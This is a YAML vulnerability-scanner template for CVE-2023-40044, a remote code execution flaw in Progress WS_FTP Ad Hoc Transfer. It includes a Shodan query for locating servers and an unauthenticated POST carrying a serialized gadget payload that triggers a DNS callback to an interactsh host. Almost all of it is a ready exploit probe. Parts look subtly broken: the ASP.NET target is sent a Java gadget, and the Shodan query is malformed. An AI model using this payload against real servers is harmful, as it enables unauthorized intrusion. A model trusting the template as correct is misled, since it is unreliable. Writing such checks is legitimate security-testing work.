id: CVE-2023-40044

info:
  name: RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules
  author: johnk3r
  severity: High
  reference:
    - https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023
    - https://nvd.nist.gov/vuln/detail/CVE-2023-40044
    - https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-40044
  metadata:
    verified: true
    max-request: 2
    vendor: Progress
    product: ws_ftp_server
    shodan-query: title:"http.favicon.hash:-2136339017"
  tags: cve,cve2023,ws_ftp,progress,rce

http:
  - raw:
      - |
        POST /AHT/AhtApiService.asmx/AuthUser HTTP/2
        Host: {{Hostname}}
        Cookie: ASP.NET_SessionId=lilzf4yfwobb5fsaelo5abez
        Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266

        -----------------------------9051914041544843365972754266
        Content-Disposition: form-data; name="";

        ::AHT_DEFAULT_UPLOAD_PARAMETER::{{generate_java_gadget("dns", "https://{{interactsh-url}}", "base64")}}
        -----------------------------9051914041544843365972754266---

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
